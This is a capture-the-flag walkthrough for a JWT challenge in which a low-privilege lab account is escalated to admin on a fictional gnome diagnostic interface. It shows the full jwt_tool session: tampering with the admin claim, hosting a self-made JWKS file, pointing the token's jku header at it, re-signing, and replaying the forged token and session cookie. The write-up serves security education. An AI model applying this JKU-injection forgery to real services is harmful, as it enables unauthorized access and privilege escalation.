---
icon: material/text-box-outline
---

# Act 2: Rogue gnome identity provider

**Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-regular-star::fontawesome-regular-star::fontawesome-regular-star:<br/>
**Direct link**: [Website](https://gnome-48371.atnascorp)

## Objective

!!! question "Request"
    Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?

??? quote "Paul Beckett"
    As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.<br/>
    I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account.<br/>
    The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.<br/>
    Ready to help me find a way to bump up our access level, yeah?

Paul got access to a Gnome's Diagnostic Interface at **gnome-48371.atnascorp** with the creds `gnome:SittingOnAShelf`, but it's just a low-privilege account.
The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.

## Solution

The initial welcome screen of the terminal has interesting information:
```
Hi, Paul here. Welcome to my web-server. I've been using it for JWT analysis.

I've discovered the Gnomes have a diagnostic interface that authenticates to an Atnas identity provider.

Unfortunately the gnome:SittingOnAShelf credentials discovered in 2015 don't have sufficient access to view the gnome diagnostic interface.

I've kept some notes in ~/notes

Can you help me gain access to the Gnome diagnostic interface and discover the name of the file the Gnome downloaded? When you identify the filename, enter it in the badge.
```

Let's first understand JWT and how it can be compromised<br/>
(https://www.jwt.io/introduction)
(https://www.youtube.com/watch?v=bHF-uOIaM-o)

- Read the notes file, and run the commands contained inside<br/>


- Generate token<br/>
`curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login`<br/>


- Analyze token<br/>
`jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTgxNzc3MiwiZXhwIjoxNzY1ODI0OTcyLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.RjoiVBmw6Whei8a4Yiv3rg62N15tKsNDvPR-bylwQGD7Ab-WPq2RybB1q7PzDH7wBRl3glkvXCRhcg7cCo-Of6tDPuriFHkHAPumDIuG8oZXrITWkbj0OqTvbiUxYKPESQJdZwRhTygORANpIGJi0hUCCnSfujufsijQ3dT9PWMDj8lprOYl6QOVFQ-PNFEA9aYe1JcA86XR-vbCZ-brch7NOlYaYGY8cBUoVjhdsyARXq7HkWVprjdg6M3xN7R0I9zyD7jp6BsEuwOKrYNDUF-2B1g2TlAzL9HBv0aqoSDivJUX9n2BGJgfANktKBeepA_ObSfePIFRppQ5EOq1Eg`<br/>


- Try to edit the `admin` attribute and get the corresponding token<br/>
`jwt_tool.py -T eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTgxNzc3MiwiZXhwIjoxNzY1ODI0OTcyLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.RjoiVBmw6Whei8a4Yiv3rg62N15tKsNDvPR-bylwQGD7Ab-WPq2RybB1q7PzDH7wBRl3glkvXCRhcg7cCo-Of6tDPuriFHkHAPumDIuG8oZXrITWkbj0OqTvbiUxYKPESQJdZwRhTygORANpIGJi0hUCCnSfujufsijQ3dT9PWMDj8lprOYl6QOVFQ-PNFEA9aYe1JcA86XR-vbCZ-brch7NOlYaYGY8cBUoVjhdsyARXq7HkWVprjdg6M3xN7R0I9zyD7jp6BsEuwOKrYNDUF-2B1g2TlAzL9HBv0aqoSDivJUX9n2BGJgfANktKBeepA_ObSfePIFRppQ5EOq1Eg`<br/>

```

Original JWT: 


====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] alg = "RS256"
[2] jku = "http://idp.atnascorp/.well-known/jwks.json"
[3] kid = "idp-key-2025"
[4] typ = "JWT"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] sub = "gnome"
[2] iat = 1765817772    ==> TIMESTAMP = 2025-12-15 16:56:12 (UTC)
[3] exp = 1765824972    ==> TIMESTAMP = 2025-12-15 18:56:12 (UTC)
[4] iss = "http://idp.atnascorp/"
[5] admin = False
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 5

Current value of admin is: False
Please enter new value and hit ENTER
> True
[1] sub = "gnome"
[2] iat = 1765817772    ==> TIMESTAMP = 2025-12-15 16:56:12 (UTC)
[3] exp = 1765824972    ==> TIMESTAMP = 2025-12-15 18:56:12 (UTC)
[4] iss = "http://idp.atnascorp/"
[5] admin = True
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 8
Timestamp updating:
[1] Update earliest timestamp to current time (keeping offsets)
[2] Add 1 hour to timestamps
[3] Add 1 day to timestamps
[4] Remove 1 hour from timestamps
[5] Remove 1 day from timestamps

Please select an option from above (1-5):
> 1
[1] sub = "gnome"
[2] iat = 1765817972    ==> TIMESTAMP = 2025-12-15 16:59:32 (UTC)
[3] exp = 1765825172    ==> TIMESTAMP = 2025-12-15 18:59:32 (UTC)
[4] iss = "http://idp.atnascorp/"
[5] admin = True
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_0b593faf3db803b0b3eabfb56c51e036 - Tampered token:
[+] eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTgxNzk3MiwiZXhwIjoxNzY1ODI1MTcyLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.RjoiVBmw6Whei8a4Yiv3rg62N15tKsNDvPR-bylwQGD7Ab-WPq2RybB1q7PzDH7wBRl3glkvXCRhcg7cCo-Of6tDPuriFHkHAPumDIuG8oZXrITWkbj0OqTvbiUxYKPESQJdZwRhTygORANpIGJi0hUCCnSfujufsijQ3dT9PWMDj8lprOYl6QOVFQ-PNFEA9aYe1JcA86XR-vbCZ-brch7NOlYaYGY8cBUoVjhdsyARXq7HkWVprjdg6M3xN7R0I9zyD7jp6BsEuwOKrYNDUF-2B1g2TlAzL9HBv0aqoSDivJUX9n2BGJgfANktKBeepA_ObSfePIFRppQ5EOq1Eg
```


- Use the forged token for access<br/>
`curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTgxNzk3MiwiZXhwIjoxNzY1ODI1MTcyLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.RjoiVBmw6Whei8a4Yiv3rg62N15tKsNDvPR-bylwQGD7Ab-WPq2RybB1q7PzDH7wBRl3glkvXCRhcg7cCo-Of6tDPuriFHkHAPumDIuG8oZXrITWkbj0OqTvbiUxYKPESQJdZwRhTygORANpIGJi0hUCCnSfujufsijQ3dT9PWMDj8lprOYl6QOVFQ-PNFEA9aYe1JcA86XR-vbCZ-brch7NOlYaYGY8cBUoVjhdsyARXq7HkWVprjdg6M3xN7R0I9zyD7jp6BsEuwOKrYNDUF-2B1g2TlAzL9HBv0aqoSDivJUX9n2BGJgfANktKBeepA_ObSfePIFRppQ5EOq1Eg`<br/>

But we get an invalid token. What might be wrong? The key used for the signature?<br/>

- Paul provided us with a web server. Copy the jwks.json produced by jwt_tool to an accessible location on that server
`cp ~/.jwt_tool/jwttool_custom_jwks.json ~/www/`<br/>

- Verify we get access to the file:<br/>
`curl http://paulweb.neighborhood/jwttool_custom_jwks.json`<br/>
![Terminal output](../img/objectives/o16/o16_2.png)<br/>

- Tamper again with the token and give it the correct values<br/>

```
jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTgyNjMwMSwiZXhwIjoxNzY1ODMzNTAxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.ufkIH26O_-tG1VibJcG_4bVruKpwk_qLczyg_iE0W3hXDFdu_Y4nwpt9vbld_0sbtnqXWO_LsXAPBtcEb8oX051IXG_unjIjeApDh7FtqiPKXbD2-2S73pTr5h-P51yvVWpdRMzkInGZJXnFi6ifGwamj92m83QR7T59knEOsUkDzFD9RS_R0wfyQ1kJm1aT-J8LtyFdeCyD3wsbH0OTSNdMKlfvMhjYMWB7PEHMDbnMvWTiuQTAQdhVnDmp-kktHMeVOTYwRFnwEJg255_VpvkqprqzFoseKA6yJxxKdecQII8OevVloAlv2LEFtc0-Ro0uBrX91uW8Dp5h-SaezQ -X i -T

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi      

/home/paul/.jwt_tool/jwtconf.ini
Original JWT: 


====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] alg = "RS256"
[2] jku = "http://idp.atnascorp/.well-known/jwks.json"
[3] kid = "idp-key-2025"
[4] typ = "JWT"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 2

Current value of jku is: http://idp.atnascorp/.well-known/jwks.json
Please enter new value and hit ENTER
> http://paulweb.neighborhood/jwttool_custom_jwks.json
[1] alg = "RS256"
[2] jku = "http://paulweb.neighborhood/jwttool_custom_jwks.json"
[3] kid = "idp-key-2025"
[4] typ = "JWT"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3

Current value of kid is: idp-key-2025
Please enter new value and hit ENTER
> jwt_tool
[1] alg = "RS256"
[2] jku = "http://paulweb.neighborhood/jwttool_custom_jwks.json"
[3] kid = "jwt_tool"
[4] typ = "JWT"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] sub = "gnome"
[2] iat = 1765826301    ==> TIMESTAMP = 2025-12-15 19:18:21 (UTC)
[3] exp = 1765833501    ==> TIMESTAMP = 2025-12-15 21:18:21 (UTC)
[4] iss = "http://idp.atnascorp/"
[5] admin = False
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 5

Current value of admin is: False
Please enter new value and hit ENTER
> True
[1] sub = "gnome"
[2] iat = 1765826301    ==> TIMESTAMP = 2025-12-15 19:18:21 (UTC)
[3] exp = 1765833501    ==> TIMESTAMP = 2025-12-15 21:18:21 (UTC)
[4] iss = "http://idp.atnascorp/"
[5] admin = True
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
key: /home/paul/.jwt_tool/jwttool_custom_private_RSA.pem
jwttool_2b047168f4e66944929e1483801a1dbf - EXPLOIT: injected JWKS
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd3R0b29sX2N1c3RvbV9qd2tzLmpzb24iLCJraWQiOiJqd3RfdG9vbCIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiJqd3RfdG9vbCIsInVzZSI6InNpZyIsImUiOiJBUUFCIiwibiI6InRjaE9WZFhVZzlUX0hWMmY5VFZaZW9IM0cydUIyNDN5QWE2SGg3UnN5ZU95MXRBcy1PRW5EMV81VFdybGpZLVJxb1Nmb0VqYkUzOHJ0VkxwX3dlRGZyb0huOEktSTlsR3VBQS13REk3MHNPVG00dFNTRHV3RDlWQkZtWEktZEZ3c1RONDQ2eVJKYWdhWlA0WmdmUG9yZU9MOWJwZkxfN0h4UE9KWjE0ejJaSlphUC03aHIxSFNhc3lUa2tSRzN1NHB5bGdvUlV1MlpVeFdocU5nMUE3ZTFZTlVydGxxYWdvb0Z4R1lrWkJYYkJYSmJIZE1Mbi1QU3MzdGMzcFdRRVFIUEFZQlNGSG5DenlURU9GUU9peGgtT1FxM0t5TDVzSEt2T1dVaFR5TzJVU09tSkhMWVViQ0VkNl9EZnJjUjRQNUVjdHdUbFRFVTFzc1hPTkdneEhBUSJ9fQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTgyNjMwMSwiZXhwIjoxNzY1ODMzNTAxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.mcHEZ5CrgPDms9kRs7WAe4j19V3xFJ6QtUtY5GXc2ArOY-e4_nmbU3lMotnR3N5QC6n2YH47_YROVTx43UaGOU98o6iyg2iiyby8N0au3D9_yaHmz-UupfShsWUN1kjz7SBmxuy5cYeK6fHBCOwdgcopkxB0PqWiUyA1soSNzUfvas0BDlQptAYq8mSTaBXQ1GZAtJj59wsLDHDnOzaty4flZzH9y02r3blS0jxOtz8lhFXSqAMLMAw1CQruxqCcscsVsiP5o9WG5xXCYAt3IyVSKlpohNsP6bQvcirn2abcDhfHtJD17DDJUHoGM15DlAGIzzVrzKU7cKJcwcMXxg
```

- Use tampered token<br/>
`curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd3R0b29sX2N1c3RvbV9qd2tzLmpzb24iLCJraWQiOiJqd3RfdG9vbCIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiJqd3RfdG9vbCIsInVzZSI6InNpZyIsImUiOiJBUUFCIiwibiI6InRjaE9WZFhVZzlUX0hWMmY5VFZaZW9IM0cydUIyNDN5QWE2SGg3UnN5ZU95MXRBcy1PRW5EMV81VFdybGpZLVJxb1Nmb0VqYkUzOHJ0VkxwX3dlRGZyb0huOEktSTlsR3VBQS13REk3MHNPVG00dFNTRHV3RDlWQkZtWEktZEZ3c1RONDQ2eVJKYWdhWlA0WmdmUG9yZU9MOWJwZkxfN0h4UE9KWjE0ejJaSlphUC03aHIxSFNhc3lUa2tSRzN1NHB5bGdvUlV1MlpVeFdocU5nMUE3ZTFZTlVydGxxYWdvb0Z4R1lrWkJYYkJYSmJIZE1Mbi1QU3MzdGMzcFdRRVFIUEFZQlNGSG5DenlURU9GUU9peGgtT1FxM0t5TDVzSEt2T1dVaFR5TzJVU09tSkhMWVViQ0VkNl9EZnJjUjRQNUVjdHdUbFRFVTFzc1hPTkdneEhBUSJ9fQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTgyNjMwMSwiZXhwIjoxNzY1ODMzNTAxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.mcHEZ5CrgPDms9kRs7WAe4j19V3xFJ6QtUtY5GXc2ArOY-e4_nmbU3lMotnR3N5QC6n2YH47_YROVTx43UaGOU98o6iyg2iiyby8N0au3D9_yaHmz-UupfShsWUN1kjz7SBmxuy5cYeK6fHBCOwdgcopkxB0PqWiUyA1soSNzUfvas0BDlQptAYq8mSTaBXQ1GZAtJj59wsLDHDnOzaty4flZzH9y02r3blS0jxOtz8lhFXSqAMLMAw1CQruxqCcscsVsiP5o9WG5xXCYAt3IyVSKlpohNsP6bQvcirn2abcDhfHtJD17DDJUHoGM15DlAGIzzVrzKU7cKJcwcMXxg`

![Terminal output](../img/objectives/o16/o16_3.png)<br/>

- Use retrieve cookie:<br/>
`curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aUBlxQ.A5PJsNiBeATn6gbtupbhea3fFpI' http://gnome-48371.atnascorp/diagnostic-interface`<br/>

![Terminal output](../img/objectives/o16/o16_4.png)
